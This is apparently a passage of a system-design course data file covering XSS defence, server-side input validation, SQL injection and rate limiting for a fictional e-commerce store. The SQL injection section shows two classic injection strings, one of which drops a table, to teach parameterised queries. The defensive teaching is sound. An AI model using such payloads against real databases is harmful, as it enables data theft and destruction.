          body: `<p style="margin-bottom:12px;">Defend XSS in depth: output encode everywhere (React JSX handles HTML context automatically), set a strict CSP header, store session tokens in HttpOnly cookies, and sanitise server-side with DOMPurify for any rich-text fields. The combination makes XSS both harder to inject and much less impactful if it does get through.</p>`,
        },
      ],
    },

    {
      id: "p3t8",
      title: "Input Validation & Sanitisation",
      subtitle:
        "Trust nothing from the client — validate and sanitise all input at the boundary.",
      sections: [
        {
          icon: "📖",
          color: "si-blue",
          title: "Simple Definition",
          body: `<p><strong>Input validation</strong> verifies that incoming data matches the expected format, type, range, and constraints (e.g., "this must be a positive integer less than 1000"). <strong>Sanitisation</strong> cleans potentially dangerous input (e.g., stripping HTML tags from a name field). Together they protect against injection attacks, data corruption, and application crashes.</p>`,
        },
        {
          icon: "🔍",
          color: "si-purple",
          title: "Why Client-Side Validation is Never Enough",
          body: `<p>ShopKart's checkout form validates quantity (must be 1-10) in JavaScript. A user opens browser DevTools and sends <code>POST /orders</code> with <code>quantity: -9999</code> directly. Without server-side validation, ShopKart creates an order for negative quantity — corrupting inventory, potentially refunding money without a purchase, or crashing with arithmetic errors. <strong>Client-side validation is UX. Server-side validation is security.</strong></p>`,
        },
        {
          icon: "🏪",
          color: "si-green",
          title: "ShopKart Validation Schema",
          body: `<div style="background:rgba(0,0,0,0.12);border-radius:6px;padding:8px 12px;font-size:12px;font-family:monospace;line-height:1.9;color:var(--text-primary);margin-bottom:14px;">
POST /orders — Zod / Joi validation schema:<br/><br/>
items: Array(min:1, max:50) of {<br/>
&nbsp;&nbsp;product_id: integer, min:1<br/>
&nbsp;&nbsp;quantity:   integer, min:1, max:100<br/>
}<br/><br/>
shipping_address: {<br/>
&nbsp;&nbsp;name:    string, min:2, max:100<br/>
&nbsp;&nbsp;pincode: regex /^\d{6}$/ ← exactly 6 digits<br/>
&nbsp;&nbsp;phone:   regex /^[6-9]\d{9}$/ ← Indian mobile<br/>
&nbsp;&nbsp;state:   enum [valid Indian states]<br/>
}<br/><br/>
payment_method: enum ["UPI","CARD","COD","WALLET"]<br/><br/>
Validation failures → 422 Unprocessable Entity:<br/>
{ field: "items[0].quantity", code: "MAX_EXCEEDED", max: 100 }<br/>
{ field: "shipping_address.pincode", code: "INVALID_FORMAT" }
</div>`,
        },
        {
          icon: "⚠️",
          color: "si-red",
          title: "SQL Injection — Validate Your Queries",
          body: `<div style="background:rgba(239,68,68,0.06);border:1px solid rgba(239,68,68,0.25);border-left:4px solid #ef4444;border-radius:8px;padding:12px 16px;font-size:13px;line-height:1.65;margin-bottom:14px;">
  <strong style="color:#ef4444;">🚨 Never interpolate user input into SQL strings</strong><br/><br/>
  <span style="color:var(--text-primary);opacity:0.9;">❌ BAD: <code>db.query("SELECT * FROM products WHERE name = '" + userInput + "'")</code></span><br/>
  <span style="font-size:12px;opacity:0.75;">userInput = <code>Nike' OR '1'='1</code> → returns ALL products<br/>
  userInput = <code>Nike'; DROP TABLE products; --</code> → destroys DB</span><br/><br/>
  <span style="color:var(--text-primary);opacity:0.9;">✅ ALWAYS: <code>db.query("SELECT * FROM products WHERE name = $1", [userInput])</code></span><br/>
  <span style="font-size:12px;opacity:0.75;">Parameterised queries send value as data, never as SQL syntax. No exceptions.</span>
</div>`,
        },
      ],
    },

    {
      id: "p3t9",
      title: "Rate Limiting",
      subtitle:
        "Protecting your API from abuse, DoS attacks, and runaway clients.",
      sections: [
        {
          icon: "📖",
          color: "si-blue",
          title: "Simple Definition",
          body: `<p><strong>Rate limiting</strong> restricts how many requests a client (identified by IP address, user ID, or API key) can make within a time window. It protects APIs from abuse (bots scraping your product catalog), prevents DoS attacks (a single client consuming all capacity), and enforces fair use policies for multi-tenant APIs.</p>`,
        },
        {
          icon: "🔍",
          color: "si-purple",
          title: "Rate Limiting Algorithms",
          body: `<div style="border:1px solid var(--border);border-radius:10px;overflow:hidden;margin-bottom:14px;">
  <div style="padding:12px 16px;border-bottom:1px solid var(--border);background:rgba(99,102,241,0.06);">
    <div style="font-weight:700;font-size:13px;color:var(--accent);margin-bottom:4px;">Fixed Window</div>
    <p style="margin:0;font-size:12px;opacity:0.85;line-height:1.6;">Count requests per minute; reset at boundary. Simple. Weakness: 200 req split across boundary — effectively double the limit in 2 seconds.</p>
  </div>
  <div style="padding:12px 16px;border-bottom:1px solid var(--border);background:rgba(16,185,129,0.04);">
    <div style="font-weight:700;font-size:13px;color:#10b981;margin-bottom:4px;">Sliding Window</div>
    <p style="margin:0;font-size:12px;opacity:0.85;line-height:1.6;">Count requests in the last N seconds relative to now. Smoother, no boundary burst. Slightly more storage (timestamp list per user in Redis).</p>
  </div>
  <div style="padding:12px 16px;border-bottom:1px solid var(--border);background:rgba(34,197,94,0.06);">
    <div style="font-weight:700;font-size:13px;color:#22c55e;margin-bottom:4px;">Token Bucket ★ recommended</div>
    <p style="margin:0;font-size:12px;opacity:0.85;line-height:1.6;">Bucket fills at constant rate. Each request consumes one token. Burst up to bucket size allowed. Most flexible — handles bursts gracefully, prevents sustained abuse.</p>
  </div>
  <div style="padding:12px 16px;">
    <div style="font-weight:700;font-size:13px;color:#8b5cf6;margin-bottom:4px;">Leaky Bucket</div>
    <p style="margin:0;font-size:12px;opacity:0.85;line-height:1.6;">Requests queued; processed at fixed rate. Excess dropped. Perfectly smooth output. Adds latency — better for traffic shaping than API rate limiting.</p>
  </div>
</div>`,
        },
        {
          icon: "🏪",
          color: "si-green",
          title: "ShopKart Rate Limit Design",
          body: `<div style="background:rgba(0,0,0,0.12);border-radius:6px;padding:8px 12px;font-size:12px;font-family:monospace;line-height:1.9;color:var(--text-primary);margin-bottom:14px;">
ShopKart rate limits (Redis + API Gateway):<br/><br/>
Public (unauthenticated, by IP):<br/>
&nbsp;&nbsp;GET /products → 100 req/min per IP<br/>
&nbsp;&nbsp;GET /search   → 30 req/min per IP (expensive)<br/><br/>
Authenticated (by user ID):<br/>
&nbsp;&nbsp;General       → 600 req/min<br/>
&nbsp;&nbsp;POST /orders  → 10 req/hour (prevent spam)<br/>
&nbsp;&nbsp;POST /reviews → 5/product/day<br/><br/>
API Key (sellers):<br/>
&nbsp;&nbsp;Paid tier     → 1000 req/min<br/>
&nbsp;&nbsp;Free tier     → 100 req/min<br/><br/>
Response headers:<br/>
&nbsp;&nbsp;X-RateLimit-Limit:     100<br/>
&nbsp;&nbsp;X-RateLimit-Remaining: 73<br/>
&nbsp;&nbsp;X-RateLimit-Reset:     1741421460 (unix ts)<br/><br/>
Exceeded → HTTP 429 Too Many Requests<br/>
&nbsp;&nbsp;Retry-After: 23 (seconds)<br/>
&nbsp;&nbsp;{ "code": "RATE_LIMIT_EXCEEDED" }
</div>`,
        },
        {
          icon: "🧠",
          color: "si-yellow",
          title: "Architect Thinking",
          body: `<p>Rate limiting should be implemented at multiple layers: <strong>API Gateway or CDN layer</strong> (CloudFront/Kong) for coarse protection against DDoS before traffic hits your servers, <strong>application layer</strong> for fine-grained per-user business rules, and <strong>database layer</strong> (connection limits) for resource exhaustion protection. Redis with the <code>INCR</code> command and key expiry is the standard implementation — fast (microseconds), atomic, and distributed (all app servers share the same Redis counter). Token bucket is the recommended algorithm for most APIs because it allows short bursts (user uploaded 5 images in quick succession) while preventing sustained abuse.</p>`,
        },
        {
          icon: "🎯",
          color: "si-orange",
          title: "Interview Insight",
          body: `<div style="background:rgba(245,158,11,0.06);border:1px solid rgba(245,158,11,0.25);border-left:4px solid #f59e0b;border-radius:8px;padding:12px 16px;font-size:13px;line-height:1.65;">
  <strong style="color:#f59e0b;">🎯 Interview: Rate Limiting Design</strong><br/>
  <span style="color:var(--text-primary);opacity:0.9;">"Redis-based token bucket per user ID. Each user gets a bucket of 100 tokens replenishing at 1/second. Each request consumes 1 token. Empty bucket → 429 with Retry-After header. Redis EVAL script ensures atomic check-and-decrement. Enforced at API gateway so app servers are protected even from clients bypassing the gateway." Cover algorithm + storage mechanism + response handling.</span>
</div>`,
        },
      ],
    },
  ],
};
